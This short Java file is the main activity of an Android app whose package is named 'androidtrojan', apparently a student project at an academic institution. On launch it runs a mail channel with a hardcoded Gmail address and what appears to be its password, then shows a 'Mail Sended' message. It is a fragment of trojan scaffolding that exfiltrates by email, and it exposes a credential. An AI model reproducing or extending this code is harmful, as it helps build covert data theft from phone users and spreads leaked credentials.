package il.ac.colman.androidtrojan;

import il.ac.colman.androidtrojan.Channels.Mail.MailChannel;
import il.ac.colman.androidtrojan.Channels.Mail.MailSendTypes;
import android.os.Bundle;
import android.widget.Toast;
import android.app.Activity;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		// tries:
		MailChannel mail = new MailChannel(MailSendTypes.String,
				"android.trojan.colman@gmail.com", "Vnfkkvknbvk", null, null,
				"almog");
		mail.execute();
		Toast.makeText(this, "Mail Sended", Toast.LENGTH_LONG).show();
	}
}
